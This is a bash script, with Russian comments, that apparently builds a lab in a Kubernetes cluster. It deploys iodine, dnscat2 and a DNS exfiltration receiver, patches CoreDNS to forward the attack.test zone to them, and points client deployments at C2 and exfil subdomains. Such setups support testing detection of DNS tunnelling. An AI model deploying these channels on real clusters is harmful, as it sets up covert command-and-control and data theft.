#!/bin/bash
#
# Деплой серверов attack-инструментов внутри кластера (namespace attack-server).
# Все серверы используют один Service (tunnel-dns) — запускайте один за раз.
#
# Использование:
#   ./deploy.sh setup         # создать namespace + service + настроить CoreDNS
#   ./deploy.sh iodine        # запустить iodine server
#   ./deploy.sh dnscat2       # запустить dnscat2 server
#   ./deploy.sh exfil         # запустить DNS exfil receiver
#   ./deploy.sh stop          # остановить все серверы (service остаётся)
#   ./deploy.sh cleanup       # удалить всё (namespace, service, CoreDNS patch)
#   ./deploy.sh status        # статус
#
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
NS="attack-server"

stop_all_servers() {
  kubectl delete -f "${SCRIPT_DIR}/01-iodine-server.yaml" --ignore-not-found 2>/dev/null || true
  kubectl delete -f "${SCRIPT_DIR}/02-dnscat2-server.yaml" --ignore-not-found 2>/dev/null || true
  kubectl delete -f "${SCRIPT_DIR}/03-exfil-receiver.yaml" --ignore-not-found 2>/dev/null || true
}

show_coredns_instructions() {
  echo ""
  echo "=== CoreDNS: настройка форварда ==="
  echo ""
  SVC_IP=$(kubectl get svc tunnel-dns -n "$NS" -o jsonpath='{.spec.clusterIP}' 2>/dev/null || echo "<pending>")
  echo "ClusterIP сервиса tunnel-dns: ${SVC_IP}"
  echo ""
  echo "Выполните:"
  echo "  kubectl edit configmap coredns -n kube-system"
  echo ""
  echo "В Corefile добавьте ПЕРЕД блоком .:53 :"
  echo ""
  echo "    attack.test:53 {"
  echo "        forward . ${SVC_IP}"
  echo "        log"
  echo "    }"
  echo ""
  echo "Сохраните, затем:"
  echo "  kubectl rollout restart deployment coredns -n kube-system"
  echo ""
}

case "${1:-}" in
  setup)
    echo "=== Creating namespace and service ==="
    kubectl apply -f "${SCRIPT_DIR}/00-namespace-and-service.yaml"
    echo ""
    echo "=== Waiting for service to get ClusterIP ==="
    sleep 2
    show_coredns_instructions
    ;;

  iodine)
    echo "=== Stopping any running servers ==="
    stop_all_servers
    echo "=== Deploying iodine server ==="
    kubectl apply -f "${SCRIPT_DIR}/01-iodine-server.yaml"
    echo ""
    echo "Iodine server deploying. Wait for pod to be ready:"
    echo "  kubectl get pods -n $NS -w"
    echo ""
    echo "Then deploy client:"
    echo "  kubectl set env deployment/iodine-client ATTACK_DOMAIN=t.attack.test -n attack"
    echo "  kubectl rollout restart deployment/iodine-client -n attack"
    ;;

  dnscat2)
    echo "=== Stopping any running servers ==="
    stop_all_servers
    echo "=== Deploying dnscat2 server ==="
    kubectl apply -f "${SCRIPT_DIR}/02-dnscat2-server.yaml"
    echo ""
    echo "dnscat2 server deploying (gem install takes 1-2 min). Wait for pod:"
    echo "  kubectl get pods -n $NS -w"
    echo ""
    echo "Then deploy client:"
    echo "  kubectl set env deployment/dnscat2-client ATTACK_DOMAIN=c2.attack.test -n attack"
    echo "  kubectl rollout restart deployment/dnscat2-client -n attack"
    ;;

  exfil)
    echo "=== Stopping any running servers ==="
    stop_all_servers
    echo "=== Deploying DNS exfil receiver ==="
    kubectl apply -f "${SCRIPT_DIR}/03-exfil-receiver.yaml"
    echo ""
    echo "Exfil receiver deploying. Wait for pod:"
    echo "  kubectl get pods -n $NS -w"
    echo ""
    echo "Then deploy client:"
    echo "  kubectl set env deployment/dnsexfiltrator-client EXFIL_DOMAIN=exfil.attack.test -n attack"
    echo "  kubectl rollout restart deployment/dnsexfiltrator-client -n attack"
    ;;

  stop)
    echo "=== Stopping all servers ==="
    stop_all_servers
    echo "Done. Service and namespace preserved."
    ;;

  cleanup)
    echo "=== Removing everything ==="
    stop_all_servers
    kubectl delete -f "${SCRIPT_DIR}/00-namespace-and-service.yaml" --ignore-not-found 2>/dev/null || true
    echo ""
    echo "Don't forget to remove the attack.test zone from CoreDNS:"
    echo "  kubectl edit configmap coredns -n kube-system"
    echo "  (remove the attack.test:53 block)"
    echo "  kubectl rollout restart deployment coredns -n kube-system"
    ;;

  status)
    echo "=== Service ==="
    kubectl get svc -n "$NS" 2>/dev/null || echo "No service found"
    echo ""
    echo "=== Pods ==="
    kubectl get pods -n "$NS" -o wide 2>/dev/null || echo "No pods found"
    echo ""
    echo "=== Server logs (last 10 lines) ==="
    for pod in $(kubectl get pods -n "$NS" -o name 2>/dev/null); do
      echo "--- $pod ---"
      kubectl logs "$pod" -n "$NS" --tail=10 2>/dev/null || true
    done
    ;;

  *)
    echo "Usage: $0 {setup|iodine|dnscat2|exfil|stop|cleanup|status}"
    echo ""
    echo "  setup    — create namespace + service, show CoreDNS instructions"
    echo "  iodine   — deploy iodine server (stops others first)"
    echo "  dnscat2  — deploy dnscat2 server (stops others first)"
    echo "  exfil    — deploy DNS exfil receiver (stops others first)"
    echo "  stop     — stop all servers (keep namespace/service)"
    echo "  cleanup  — remove everything"
    echo "  status   — show pods, service, logs"
    exit 1
    ;;
esac
